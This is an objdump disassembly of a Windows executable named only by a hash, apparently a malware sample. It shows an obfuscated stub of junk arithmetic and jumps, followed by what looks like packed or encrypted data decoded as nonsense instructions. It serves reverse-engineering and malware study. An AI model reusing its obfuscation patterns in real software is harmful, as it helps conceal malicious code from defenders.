
e889d97c138bdcdb9d22d21e471878c833165305ac2a7c4a15e23b64525cfab3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	sbb    DWORD PTR ds:0x42295a,0x42291e
  401019:	sub    eax,edx
  40101b:	push   edi
  40101c:	mov    edx,0x159a
  401021:	mov    edi,DWORD PTR [ebp-0x4c]
  401024:	mov    DWORD PTR [ebp-0x50],eax
  401027:	sbb    ecx,edi
  401029:	add    eax,eax
  40102b:	mov    DWORD PTR [ebp-0x4c],ecx
  40102e:	or     DWORD PTR [ebp-0x50],0xba68fc47
  401035:	or     DWORD PTR [ebp-0x4c],0x9c0a89d8
  40103c:	mov    eax,DWORD PTR [ebp-0x58]
  40103f:	mov    ecx,DWORD PTR [ebp-0x54]
  401042:	inc    edi
  401043:	mov    edx,DWORD PTR [ebp-0x58]
  401046:	adc    DWORD PTR ds:0x4228c2,0x7b28
  401050:	mov    edi,DWORD PTR [ebp-0x54]
  401053:	sub    eax,edx
  401055:	mov    edx,DWORD PTR ds:0x422926
  40105b:	mov    DWORD PTR [ebp-0x58],eax
  40105e:	sbb    ecx,edi
  401060:	xor    DWORD PTR ds:0x422936,ecx
  401066:	mov    DWORD PTR [ebp-0x54],ecx
  401069:	adc    edx,0x6dea
  40106f:	or     DWORD PTR [ebp-0x58],0xba68805f
  401076:	or     DWORD PTR [ebp-0x54],0x9c0a89d8
  40107d:	lea    eax,[ebp+0x20]
  401080:	mov    DWORD PTR [ebp-0xc],eax
  401083:	add    edx,edx
  401085:	mov    eax,ds:0x4220e0
  40108a:	mov    ecx,DWORD PTR [ebp-0xc]
  40108d:	mov    eax,DWORD PTR [eax]
  40108f:	xor    DWORD PTR ds:0x42293a,0x72a2
  401099:	add    eax,DWORD PTR [ecx]
  40109b:	xor    edx,edx
  40109d:	or     edx,DWORD PTR ds:0x422a4a
  4010a3:	mov    edx,DWORD PTR [edx]
  4010a5:	and    DWORD PTR ds:0x42299e,edx
  4010ab:	jmp    0x401635
  4010b0:	and    eax,0xffffffe4
  4010b3:	xor    eax,0xa0123954
  4010b8:	sbb    al,0x80
  4010ba:	mov    WORD PTR [esi-0x69],gs
  4010bd:	xchg   dh,al
  4010bf:	scas   al,BYTE PTR es:[edi]
  4010c0:	push   ss
  4010c1:	push   ss
  4010c2:	push   ss
  4010c3:	push   ss
  4010c4:	cmp    eax,0xd8161604
  4010c9:	cwde   
  4010ca:	test   DWORD PTR ds:0xbf40847e,ebp
  4010d0:	cmp    DWORD PTR [esi],esi
  4010d2:	sbb    al,0x24
  4010d4:	push   edi
  4010d5:	popf   
  4010d6:	popa   
  4010d7:	mov    edi,0xdc392d4f
  4010dc:	rol    BYTE PTR [ebx+edx*8-0x3aaad908],0x9
  4010e4:	push   eax
  4010e5:	mov    dl,0xfe
  4010e7:	test   DWORD PTR [ecx+0x7894fd68],0xfdcbb128
  4010f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f2:	dec    esi
  4010f3:	sbb    DWORD PTR [eax+0x38],ecx
  4010f6:	xor    BYTE PTR [eax-0x36c9554f],dl
  4010fc:	pop    es
  4010fd:	cmp    edi,ebx
  4010ff:	dec    edx
  401100:	rcl    edx,cl
  401102:	inc    eax
  401103:	inc    ebp
  401104:	push   ecx
  401105:	jl     0x40110c
  401107:	pop    ss
  401108:	mov    esi,DWORD PTR [ebx-0x30]
  40110b:	dec    edx
  40110c:	dec    ebp
  40110d:	dec    esi
  40110e:	ror    BYTE PTR [eax+0x5f42789e],0x3a
  401115:	or     dl,bh
  401117:	mov    al,ds:0x42d8f959
  40111c:	daa    
  40111d:	bound  edi,QWORD PTR [edi-0x1d]
  401120:	scas   eax,DWORD PTR es:[edi]
  401121:	test   eax,0xa527f95d
  401126:	mov    ch,0x94
  401128:	pop    ds
  401129:	push   ss
  40112a:	inc    edi
  40112b:	fdiv   DWORD PTR [edx]
  40112d:	imul   esi,esp,0xd0d5aab1
  401133:	mov    eax,0x2ca27ede
  401138:	jecxz  0x4011a2
  40113a:	add    esp,DWORD PTR [ecx]
  40113c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40113d:	inc    ebp
  40113e:	fucomp st(6)
  401140:	loopne 0x401178
  401142:	mov    ds:0xf9f819cb,al
  401147:	hlt    
  401148:	push   ss
  401149:	rcl    DWORD PTR [ecx+0xd],1
  40114c:	out    0x16,eax
  40114e:	jmp    0xf33c01
  401153:	rol    esi,1
  401155:	retf   
  401156:	mov    dh,0x34
  401158:	xor    bh,dl
  40115a:	push   edx
  40115b:	and    BYTE PTR [ecx-0x7eb27591],bl
  401161:	inc    ebp
  401162:	fiadd  DWORD PTR [edx+0x1c6c82ea]
  401168:	cmc    
  401169:	sub    eax,0x93f8e31e
  40116e:	ds repnz dec edx
  401171:	loop   0x4010f8
  401173:	ret    
  401174:	dec    edx
  401175:	cmp    eax,0x6e2eae3a
  40117a:	mov    ebp,0x90aac12a
  40117f:	jns    0x40118f
  401181:	and    BYTE PTR [ebx+0x12b26854],dh
  401187:	mov    bl,0xc9
  401189:	enter  0x392a,0xfe
  40118d:	ror    BYTE PTR [ecx-0x3b],1
  401190:	in     al,0x42
  401192:	jb     0x401123
  401194:	imul   ecx,DWORD PTR [ecx-0x69],0x2f
  401198:	iret   
  401199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40119a:	add    ebx,ecx
  40119c:	jb     0x40115c
  40119e:	xor    DWORD PTR [edi],esi
  4011a0:	mov    edx,0x22a6c993
  4011a5:	mov    ds:0x26c1b82a,eax
  4011aa:	ja     0x401162
  4011ac:	fdiv   st,st(5)
  4011ae:	push   ebp
  4011af:	dec    eax
  4011b0:	push   esp
  4011b1:	dec    ebx
  4011b2:	mov    ?,ebx
  4011b4:	out    dx,eax
  4011b5:	test   al,0x67
  4011b7:	jne    0x401201
  4011b9:	dec    esi
  4011ba:	fistp  WORD PTR [esi-0x78]
  4011bd:	inc    ebx
  4011be:	sub    DWORD PTR [edi-0x58],ebp
  4011c1:	mov    bl,al
  4011c3:	(bad)  
  4011c4:	and    edx,DWORD PTR [edx]
  4011c6:	cmc    
  4011c7:	mov    ah,0xe9
  4011c9:	jge    0x4011f2
  4011cb:	sub    edx,eax
  4011cd:	(bad)  
  4011cf:	push   es
  4011d0:	popf   
  4011d1:	js     0x401180
  4011d3:	adc    BYTE PTR [edi-0x29],dh
  4011d6:	mov    cl,0x5c
  4011d8:	xchg   ebx,eax
  4011d9:	mov    al,0xb9
  4011db:	adc    eax,0xd149a6ce
  4011e0:	(bad)  
  4011e1:	shl    BYTE PTR [edx-0x260f28c7],0x26
  4011e8:	rcr    BYTE PTR [edx+0x29],1
  4011eb:	sub    dh,BYTE PTR [ebx+ebx*4-0x6aa9557b]
  4011f2:	icebp  
  4011f3:	loopne 0x401232
  4011f5:	rol    DWORD PTR [ebx-0x2b],1
  4011f8:	jae    0x401252
  4011fa:	(bad)  
  4011fb:	(bad)  [eax]
  4011fd:	mov    al,ds:0xd5fe88a9
  401202:	inc    ebx
  401203:	sbb    al,0x7b
  401205:	push   cs
  401206:	arpl   WORD PTR [esi],bx
  401208:	fs pop esp
  40120a:	sub    ah,bh
  40120c:	dec    bl
  40120e:	jle    0x4011bd
  401210:	add    eax,edx
  401212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401213:	(bad)  
  401214:	fldcw  WORD PTR [edi+0x5dc57320]
  40121a:	fst    QWORD PTR [eax-0x6d]
  40121d:	push   esp
  40121e:	mov    ecx,0x1beddcd5
  401223:	lahf   
  401224:	jbe    0x401221
  401226:	push   ecx
  401227:	mov    ebx,0xbcc8253e
  40122c:	iret   
  40122d:	imul   esi,DWORD PTR [eax+esi*1+0x30c63ce3],0xffffffc7
  401235:	inc    edi
  401236:	test   BYTE PTR ds:0x8d1ad3e7,0xe9
  40123d:	js     0x40125f
  40123f:	scas   eax,DWORD PTR es:[edi]
  401240:	outs   dx,DWORD PTR ds:[esi]
  401241:	fsub   QWORD PTR [edi-0x35]
  401244:	mov    ebp,0xbd48da30
  401249:	jo     0x40126a
  40124b:	pop    esp
  40124c:	adc    eax,0x3908302c
  401251:	sbb    eax,esi
  401253:	pop    ecx
  401254:	and    DWORD PTR [edx],0xffffff9c
  401257:	test   al,0x12
  401259:	fadd   DWORD PTR [esi+0x5cf86b6e]
  40125f:	push   0xaecf22af
  401264:	clc    
  401265:	das    
  401266:	(bad)  
  401268:	gs cmp eax,0xe1b28f11
  40126e:	pop    ecx
  40126f:	frstor [eax]
  401271:	(bad)  
  401272:	adc    al,0x97
  401274:	adc    al,0xa4
  401276:	repz jo 0x401241
  401279:	mov    al,0xe2
  40127b:	push   ebp
  40127c:	cld    
  40127d:	xchg   edi,eax
  40127e:	pop    ds
  40127f:	je     0x4012a6
  401281:	fwait
  401282:	ret    0xb916
  401285:	or     cl,BYTE PTR [edx+0x680aa4a4]
  40128b:	repz push esp
  40128d:	mov    bl,0xac
  40128f:	das    
  401290:	sbb    ebx,DWORD PTR [ecx+0x2d]
  401293:	push   eax
  401294:	lods   eax,DWORD PTR ds:[esi]
  401295:	jl     0x401270
  401297:	imul   ebx,eax,0xcab45591
  40129d:	jb     0x40128a
  40129f:	push   esp
  4012a0:	out    dx,eax
  4012a1:	dec    edx
  4012a2:	std    
  4012a3:	stos   BYTE PTR es:[edi],al
  4012a4:	push   edi
  4012a5:	test   al,0x87
  4012a7:	out    dx,eax
  4012a8:	ret    0xb7d5
  4012ab:	call   0xe621c0
  4012b0:	fnsave [edi]
  4012b2:	dec    esi
  4012b3:	push   ebp
  4012b4:	int    0x45
  4012b6:	pop    ecx
  4012b7:	sbb    eax,0x235aabce
  4012bc:	loope  0x401257
  4012be:	add    DWORD PTR [ebp+esi*8-0x404284ac],esp
  4012c5:	in     al,0x32
  4012c7:	jnp    0x401335
  4012c9:	adc    eax,0xebafbcd2
  4012ce:	pop    esp
  4012cf:	and    eax,0xc9dba486
  4012d4:	int3   
  4012d5:	mov    ebx,0x786c58c
  4012da:	aas    
  4012db:	bound  esi,QWORD PTR [edx]
  4012dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012de:	add    BYTE PTR [ecx-0x67411a19],ch
  4012e4:	shl    BYTE PTR [edi+ebp*4-0x3c],1
  4012e8:	cmp    edi,0x7d
  4012eb:	ds or  ebx,ecx
  4012ee:	mul    edx
  4012f0:	xor    DWORD PTR [edx+ecx*2+0x3c],esi
  4012f4:	je     0x4012bd
  4012f6:	jecxz  0x40134b
  4012f8:	jecxz  0x401344
  4012fa:	and    al,0x19
  4012fc:	lods   al,BYTE PTR ds:[esi]
  4012fd:	or     al,0xb1
  4012ff:	inc    esp
  401300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401301:	test   DWORD PTR [si-0x7171],ebx
  401306:	mov    edi,0x23d2937
  40130b:	xchg   ebp,eax
  40130c:	mov    dh,0x38
  40130e:	push   esp
  40130f:	fbld   TBYTE PTR [ecx+esi*4]
  401312:	xchg   ebx,eax
  401313:	in     al,0xc3
  401315:	in     eax,dx
  401316:	pop    eax
  401317:	mov    ebx,DWORD PTR [ebx-0x39462f21]
  40131d:	cmp    DWORD PTR [edx],esp
  40131f:	sub    BYTE PTR [edi+0x470b5bbf],cl
  401325:	push   ebp
  401326:	mov    ss,ebp
  401328:	mov    BYTE PTR [esi+0x397bcb2d],ah
  40132e:	inc    esp
  40132f:	inc    ecx
  401330:	test   cl,bh
  401332:	cmp    DWORD PTR [edi-0x6d],esi
  401335:	sbb    eax,0xd8fd8c2f
  40133b:	pop    ss
  40133c:	loopne 0x4013b9
  40133e:	or     eax,0x23ca2185
  401343:	aam    0x7d
  401345:	das    
  401346:	(bad)  
  401347:	cmp    al,0x58
  401349:	or     al,0xab
  40134b:	dec    ecx
  40134c:	dec    ebp
  40134d:	bound  ebp,QWORD PTR [ebp-0xa59ec1a]
  401353:	pop    esi
  401354:	mov    ebx,0x458af3b8
  401359:	push   0x2f
  40135b:	add    DWORD PTR [eax-0x420d2167],esi
  401361:	rol    DWORD PTR [edx],0xa5
  401364:	hlt    
  401365:	js     0x4012fe
  401367:	leave  
  401368:	lock xchg edi,eax
  40136a:	into   
  40136b:	hlt    
  40136c:	mov    cl,0xad
  40136e:	mov    BYTE PTR [ebx],bl
  401370:	pop    ecx
  401371:	sbb    dl,BYTE PTR [edx]
  401373:	push   ebx
  401374:	fwait
  401375:	mov    edx,0x7f2181a1
  40137a:	inc    edi
  40137b:	push   ds
  40137c:	in     al,dx
  40137d:	loopne 0x4013be
  40137f:	push   edx
  401380:	or     BYTE PTR [ecx+edx*4-0x1c],cl
  401384:	test   al,0x81
  401386:	xsha1  (bad)
  401387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401388:	mov    bh,bh
  40138a:	or     eax,0xaa503539
  40138f:	jmp    0x6c28b628
  401394:	dec    ecx
  401395:	bound  esp,QWORD PTR [esi-0x32]
  401398:	(bad)  
  401399:	pop    ds
  40139a:	inc    edx
  40139b:	pop    ebp
  40139c:	push   esp
  40139d:	fxtract 
  40139f:	lods   eax,DWORD PTR ds:[esi]
  4013a0:	and    BYTE PTR [ebp+0x74709723],0x4e
  4013a7:	jne    0x4013fc
  4013a9:	xor    DWORD PTR [eax],0xbd71e8f
  4013af:	xor    al,0x2
  4013b1:	xchg   ebx,eax
  4013b2:	push   ecx
  4013b3:	pusha  
  4013b4:	outs   dx,BYTE PTR ds:[esi]
  4013b5:	pop    esi
  4013b6:	mov    dh,dh
  4013b8:	push   ecx
  4013b9:	sub    ebp,DWORD PTR [edx+eax*4+0x7b667f95]
  4013c0:	lahf   
  4013c1:	adc    bl,al
  4013c3:	jno    0x40136f
  4013c5:	cpuid  
  4013c7:	jo     0x4013f9
  4013c9:	jecxz  0x401377
  4013cb:	sub    DWORD PTR [ebx+0x16],ebp
  4013ce:	es cld 
  4013d0:	jno    0x401424
  4013d2:	cmc    
  4013d3:	add    eax,0xfed9f8d3
  4013d8:	shl    BYTE PTR [edx],cl
  4013da:	(bad)  
  4013db:	cmc    
  4013dc:	cmp    al,BYTE PTR [ebx+0x3a]
  4013df:	cmp    bl,BYTE PTR [edi-0x1ca69b28]
  4013e5:	scas   al,BYTE PTR es:[edi]
  4013e6:	mov    al,ds:0x1feeb60e
  4013eb:	sbb    BYTE PTR [eax-0x6f],ch
  4013ee:	enter  0x3476,0x99
  4013f2:	jg     0x4013d1
  4013f4:	sbb    BYTE PTR [edx],bl
  4013f6:	xchg   esi,eax
  4013f7:	xchg   ebp,ecx
  4013f9:	aam    0x7b
  4013fb:	rcl    DWORD PTR [edi+0x4f],cl
  4013fe:	add    BYTE PTR [edi-0x75],0xb
  401402:	xchg   edi,eax
  401403:	pop    esi
  401404:	pop    esi
  401405:	cmp    DWORD PTR [ebx-0x5f6cf6d8],edi
  40140b:	dec    esp
  40140c:	pop    es
  40140d:	sbb    dl,BYTE PTR es:[esi-0x7487508b]
  401414:	neg    DWORD PTR [edi-0x16]
  401417:	ins    DWORD PTR es:[edi],dx
  401418:	mov    ebp,0x5cda552b
  40141d:	jmp    0x1c3e:0x7ac80164
  401424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401425:	call   FWORD PTR [edi]
  401427:	jo     0x401409
  401429:	in     al,0x2f
  40142b:	xchg   edx,eax
  40142c:	jmp    0x1398:0xa3cfbfa6
  401433:	push   0xc616594c
  401438:	aaa    
  401439:	fs push ebx
  40143b:	mov    dh,0x42
  40143d:	(bad)  
  40143e:	mov    edx,0x357505a3
  401443:	pushf  
  401444:	xor    DWORD PTR [ebp+edi*1+0x20026e24],ebx
  40144b:	mov    dh,0x81
  40144d:	mov    ebp,0x2e671f30
  401452:	fist   WORD PTR [ecx+0x32]
  401455:	mov    cl,0x7
  401457:	mov    ecx,0xb2dbfef4
  40145c:	xor    bh,dl
  40145e:	dec    ecx
  40145f:	lahf   
  401460:	cld    
  401461:	mov    cl,BYTE PTR [edx]
  401463:	out    dx,al
  401464:	stc    
  401465:	mov    edi,0x71e8350d
  40146a:	scas   al,BYTE PTR es:[edi]
  40146b:	add    ebx,edx
  40146d:	cwde   
  40146e:	add    BYTE PTR [ecx-0x52fd8b99],0x2a
  401475:	mov    bh,0x8b
  401477:	adc    BYTE PTR [ecx],0xd7
  40147a:	xlat   BYTE PTR ds:[ebx]
  40147b:	std    
  40147c:	mov    bl,0x38
  40147e:	dec    edx
  40147f:	sub    DWORD PTR [esi-0x3f],edi
  401482:	pop    edx
  401483:	es shl bl,0x11
  401487:	ja     0x401479
  401489:	xchg   esi,eax
  40148a:	cmp    DWORD PTR [edx-0x27],esi
  40148d:	xor    ah,BYTE PTR [eax+edi*1+0x2c]
  401491:	xor    eax,0xf05fcbb0
  401496:	cwde   
  401497:	enter  0x4901,0xbb
  40149b:	int3   
  40149c:	cld    
  40149d:	cld    
  40149e:	sub    al,0x2
  4014a0:	push   ss
  4014a1:	add    al,0xad
  4014a3:	add    eax,0x5cbb0f5f
  4014a8:	fmul   DWORD PTR [ebx+0x35]
  4014ab:	push   edi
  4014ac:	neg    esi
  4014ae:	jecxz  0x401470
  4014b0:	fbld   TBYTE PTR [edi+0x2dd8f846]
  4014b6:	jno    0x4014f8
  4014b8:	xor    DWORD PTR [ebx+0x30],0x649e9c57
  4014bf:	loop   0x401472
  4014c1:	repz inc eax
  4014c3:	jno    0x401536
  4014c5:	jbe    0x4014c9
  4014c7:	sar    esp,0x55
  4014ca:	ss in  al,dx
  4014cc:	pop    esp
  4014cd:	mov    fs,WORD PTR [ecx+0x3fb6998e]
  4014d3:	xchg   edi,eax
  4014d4:	mov    ch,0x0
  4014d6:	or     BYTE PTR [esp+ebp*8+0x2b6f4361],dh
  4014dd:	pop    eax
  4014de:	loopne 0x4014ca
  4014e0:	and    dl,bh
  4014e2:	xor    BYTE PTR [esi*4-0x7398d14a],bl
  4014e9:	and    BYTE PTR [edx+0x28553025],0x44
  4014f0:	lock js 0x401492
  4014f3:	test   DWORD PTR [ebx+0x7eca3d5c],esp
  4014f9:	pop    esp
  4014fa:	fcomp  DWORD PTR [ecx+0x33accaef]
  401500:	pop    ebp
  401501:	xchg   ecx,eax
  401502:	or     BYTE PTR cs:[esi-0x20],bl
  401506:	enter  0x3536,0xc9
  40150a:	xor    ah,al
  40150c:	pusha  
  40150d:	pop    eax
  40150e:	(bad)  
  401510:	jns    0x40157b
  401512:	mov    edx,0x976c88d7
  401517:	sub    bh,BYTE PTR [eax+eiz*4+0x5c533f4b]
  40151e:	jbe    0x4014b6
  401520:	mov    ds:0x3d1a1fed,al
  401525:	repnz sub al,0x92
  401528:	retf   0xfa21
  40152b:	lock jmp 0x410c265d
  401531:	in     eax,0xca
  401533:	or     eax,0xa19c5dbc
  401538:	jo     0x4014e5
  40153a:	jecxz  0x401502
  40153c:	test   DWORD PTR [eax+0x11],edi
  40153f:	sahf   
  401540:	inc    esp
  401541:	xor    al,0xd6
  401543:	lock loope 0x4015a7
  401546:	jmp    0x69a:0xf4497875
  40154d:	jno    0x401587
  40154f:	add    bh,BYTE PTR [ecx+0x17]
  401552:	imul   esi,DWORD PTR ds:0x85cb5a0a,0xe2dce7cb
  40155c:	aas    
  40155d:	iret   
  40155e:	fdiv   DWORD PTR [edx+ebp*2]
  401561:	sub    DWORD PTR [esp+ebx*4-0x5b],ebx
  401565:	sbb    DWORD PTR [ebx],edx
  401567:	adc    eax,0x5845ee0c
  40156c:	cmp    cl,BYTE PTR [ebp*2+0x32545d94]
  401573:	mov    BYTE PTR [esi-0x590c66a2],0xaa
  40157a:	mov    al,ds:0x7bf3c23d
  40157f:	pop    eax
  401580:	loopne 0x40155f
  401582:	clc    
  401583:	lock sub al,0xeb
  401586:	xchg   edi,eax
  401587:	pop    ecx
  401588:	mov    bl,0x20
  40158a:	or     ebx,DWORD PTR [edx]
  40158c:	xor    bh,BYTE PTR [ebx-0x7b]
  40158f:	scas   eax,DWORD PTR es:[edi]
  401590:	jecxz  0x4015c4
  401592:	sbb    eax,0xd2c4b5fa
  401597:	imul   edi,DWORD PTR [esi+0x4c],0x77
  40159b:	pop    esp
  40159c:	sbb    BYTE PTR [edx-0x18330057],bh
  4015a2:	xlat   BYTE PTR ds:[ebx]
  4015a3:	and    BYTE PTR [esi-0x15],cl
  4015a6:	pop    edx
  4015a7:	shr    BYTE PTR [edi-0x2c],1
  4015aa:	repz xchg esp,eax
  4015ac:	mov    al,0x38
  4015ae:	sbb    BYTE PTR [esi],al
  4015b0:	mov    ebp,0x251ecf54
  4015b5:	shl    DWORD PTR [ecx],cl
  4015b7:	shr    BYTE PTR [edi-0x32aecfa],cl
  4015bd:	xchg   esp,eax
  4015be:	sub    DWORD PTR [ebp-0x2e4c6915],edx
  4015c4:	jle    0x40154d
  4015c6:	jmp    0x40159a
  4015c8:	and    ch,BYTE PTR [ecx]
  4015ca:	lock push edi
  4015cc:	mov    ds:0x25cc43e1,eax
  4015d1:	mov    ?,WORD PTR [ebx+0x25]
  4015d4:	push   eax
  4015d6:	pushf  
  4015d7:	push   ebx
  4015d8:	mov    ebx,ecx
  4015da:	jg     0x4015ef
  4015dc:	xchg   edi,eax
  4015dd:	out    dx,eax
  4015de:	pusha  
  4015df:	gs jl  0x401576
  4015e2:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4015e4:	add    ah,BYTE PTR [esi]
  4015e6:	pop    esi
  4015e7:	gs jnp 0x401651
  4015ea:	jns    0x401576
  4015ec:	dec    edx
  4015ed:	or     al,0xdc
  4015ef:	loopne 0x4015c3
  4015f1:	dec    esp
  4015f2:	popf   
  4015f3:	pop    esi
  4015f4:	(bad)  
  4015f5:	popf   
  4015f6:	in     eax,0x5d
  4015f8:	pop    ecx
  4015f9:	in     al,dx
  4015fa:	adc    ebx,DWORD PTR [eax]
  4015fc:	arpl   WORD PTR [ebx-0x2b65a1b2],dx
  401602:	test   DWORD PTR [edi-0x1d],ebp
  401605:	jg     0x40161f
  401607:	cmp    al,0xb9
  401609:	jne    0x4015f2
  40160b:	and    al,0x16
  40160d:	mulps  xmm1,XMMWORD PTR [eax+0x7383975e]
  401614:	mov    ds:0x5c595f5a,eax
  401619:	jle    0x401699
  40161b:	aaa    
  40161c:	pop    eax
  40161d:	mov    al,BYTE PTR [esi-0x2abb7c95]
  401623:	ret    
  401624:	jmp    0xfabe:0x92017ea9
  40162b:	pop    ds
  40162c:	leave  
  40162d:	clc    
  40162e:	jmp    DWORD PTR [ebx]
  401630:	xor    DWORD PTR [ebx+0x1d],ecx
  401633:	test   bh,cl
  401635:	mov    edi,0x2e9a655c
  40163a:	xor    edx,DWORD PTR ds:0x4228e2
  401640:	mov    DWORD PTR [ebp-0x14],eax
  401643:	add    DWORD PTR ds:0x4228a6,ebx
  401649:	mov    eax,DWORD PTR [ebp+0x18]
  40164c:	jmp    0x401bd6
  401651:	fdivr  DWORD PTR [ebp+0x2c]
  401654:	lds    ebp,FWORD PTR [eax]
  401656:	xchg   esp,eax
  401657:	pop    eax
  401658:	and    BYTE PTR [ecx-0x474d3155],dl
  40165e:	outs   dx,DWORD PTR ds:[esi]
  40165f:	jbe    0x40160f
  401661:	cmp    eax,0x3d161604
  401666:	add    al,0x16
  401668:	push   ss
  401669:	sar    DWORD PTR [esi-0x38],1
  40166c:	aaa    
  40166d:	push   0x17
  40166f:	xchg   ebp,eax
  401670:	mov    dl,0x24
  401672:	pushf  
  401673:	pop    ds
  401674:	and    DWORD PTR [eax],ebp
  401676:	ins    DWORD PTR es:[edi],dx
  401677:	fcmovnbe st,st(6)
  401679:	icebp  
  40167a:	jne    0x401657
  40167c:	fisttp QWORD PTR [eax+edx*4-0x29f28bd8]
  401683:	xchg   esi,eax
  401684:	popa   
  401685:	push   ebx
  401686:	lock sub DWORD PTR gs:[ecx+0xafb8f22],edi
  40168e:	add    al,0x81
  401690:	cdq    
  401691:	add    eax,DWORD PTR [eax+0x24]
  401694:	push   edx
  401695:	es imul esp,esp,0x21
  401699:	test   eax,0x7f8d1b50
  40169e:	dec    ebp
  40169f:	loope  0x40166d
  4016a1:	push   eax
  4016a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016a3:	push   ss
  4016a4:	jne    0x4016c3
  4016a6:	in     eax,dx
  4016a7:	pop    ss
  4016a8:	pop    ebp
  4016a9:	popf   
  4016aa:	push   ecx
  4016ab:	test   al,0x34
  4016ad:	xchg   ecx,eax
  4016ae:	dec    esp
  4016af:	sub    ebx,DWORD PTR [esi+0x42]
  4016b2:	inc    esi
  4016b3:	lds    edi,FWORD PTR [edi-0x7d]
  4016b6:	mov    dl,0x45
  4016b8:	std    
  4016b9:	mov    ebx,0x806203f3
  4016be:	neg    BYTE PTR [esi]
  4016c0:	repz pop eax
  4016c2:	aaa    
  4016c3:	aam    0x25
  4016c5:	aam    0xa2
  4016c7:	jl     0x401744
  4016c9:	test   BYTE PTR [ebp+0x3a738929],bh
  4016cf:	in     al,dx
  4016d0:	xor    ch,BYTE PTR [eax+eiz*2+0x3dfedbdb]
  4016d7:	out    dx,eax
  4016d8:	aaa    
  4016d9:	mov    bh,0x8e
  4016db:	imul   BYTE PTR [ebx-0x6a]
  4016de:	dec    eax
  4016df:	jl     0x4016e2
  4016e1:	jg     0x40170e
  4016e3:	fcomp  DWORD PTR [esi+0x6f]
  4016e6:	push   es
  4016e7:	cdq    
  4016e8:	add    eax,0xe5d2d916
  4016ed:	xchg   ebp,eax
  4016ee:	or     eax,0x3f304746
  4016f3:	mov    es,eax
  4016f5:	mov    DWORD PTR ds:0x3ac91272,edi
  4016fb:	dec    eax
  4016fc:	xchg   esi,eax
  4016fd:	pop    edi
  4016fe:	or     eax,0x9a987fca
  401703:	xchg   DWORD PTR [edi-0x5389c278],eax
  401709:	aad    0xd5
  40170b:	dec    esp
  40170c:	mov    BYTE PTR [ebp+0x7c],dl
  40170f:	das    
  401710:	popf   
  401711:	aam    0x30
  401713:	fxch   st(6)
  401715:	push   0x5f6f3f47
  40171a:	xchg   esp,eax
  40171b:	aaa    
  40171c:	and    BYTE PTR [ebx+0x6f],dl
  40171f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401720:	fcompp 
  401722:	xchg   edi,eax
  401723:	shl    DWORD PTR [edx-0x1e5b3678],cl
  401729:	retf   
  40172a:	dec    BYTE PTR [ebx+esi*1]
  40172d:	cmc    
  40172e:	stos   DWORD PTR es:[edi],eax
  40172f:	add    ch,BYTE PTR [eax]
  401731:	jne    0x40173f
  401733:	arpl   WORD PTR ds:0xee90d824,ax
  401739:	stos   DWORD PTR es:[edi],eax
  40173a:	rcl    DWORD PTR [edi],cl
  40173c:	repz sbb ah,dh
  40173f:	jg     0x4016fb
  401741:	shr    DWORD PTR [edx+0x55],cl
  401744:	push   ss
  401745:	out    0x20,al
  401747:	pop    ss
  401748:	jo     0x401763
  40174a:	lea    edi,[ebx+0x4c14519e]
  401750:	jb     0x401768
  401752:	push   edi
  401753:	mov    ebp,0x39d9d797
  401758:	pushf  
  401759:	int    0xb1
  40175b:	and    al,0xff
  40175d:	cld    
  40175e:	(bad)  
  40175f:	in     eax,0xde
  401761:	loope  0x4017d8
  401763:	rcr    BYTE PTR [edx],0x16
  401766:	xor    esp,DWORD PTR [esi-0x65]
  401769:	xchg   ebx,eax
  40176a:	xlat   BYTE PTR ds:[ebx]
  40176b:	fbld   TBYTE PTR [ecx-0x6b]
  40176e:	jnp    0x4017c0
  401770:	pushf  
  401771:	jl     0x4017a8
  401773:	das    
  401774:	xchg   esi,eax
  401775:	push   esi
  401776:	out    0xda,eax
  401778:	xor    DWORD PTR [ecx+0x32],ebp
  40177b:	xchg   ebp,eax
  40177c:	xchg   edi,eax
  40177d:	inc    ebp
  40177e:	jno    0x40174a
  401780:	xchg   esi,eax
  401781:	imul   esi,DWORD PTR [eax-0x73],0xfb3bf1d3
  401788:	ja     0x401773
  40178a:	add    BYTE PTR [edx-0x60],0x8f
  40178e:	mov    ecx,0xe36caca9
  401793:	shl    dl,0x47
  401796:	les    edx,FWORD PTR fs:[ebx]
  401799:	jle    0x4017aa
  40179b:	loop   0x401727
  40179d:	mov    esi,0x441099a8
  4017a2:	lea    ecx,[ebx]
  4017a4:	(bad)  
  4017a5:	aad    0xe4
  4017a7:	jg     0x4017ae
  4017a9:	and    al,BYTE PTR fs:[ecx]
  4017ac:	push   ss
  4017ad:	jb     0x4017ae
  4017af:	mul    DWORD PTR [ebx+0x65]
  4017b2:	addr16 mov esp,0xc230c433
  4017b8:	sub    edx,DWORD PTR [esi-0x46a76a33]
  4017be:	lock daa 
  4017c0:	outs   dx,BYTE PTR ds:[esi]
  4017c1:	(bad)  [edi+ebp*8+0x64a3dd74]
  4017c8:	and    al,0xc
  4017ca:	ins    BYTE PTR es:[edi],dx
  4017cb:	mov    bh,0x68
  4017cd:	and    BYTE PTR [edi+0x5798ad80],dl
  4017d3:	pushf  
  4017d4:	dec    esp
  4017d5:	adc    eax,0x80f43790
  4017da:	daa    
  4017db:	mov    WORD PTR [ebx],fs
  4017dd:	frstor [ebx+0x42]
  4017e0:	dec    ecx
  4017e1:	rcl    BYTE PTR [edx+ebx*1-0x15],0x0
  4017e6:	sahf   
  4017e7:	adc    al,0x9c
  4017e9:	inc    eax
  4017ea:	sbb    bh,al
  4017ec:	mov    edi,cs
  4017ee:	jae    0x40178e
  4017f0:	fprem  
  4017f2:	push   es
  4017f3:	retf   0x2997
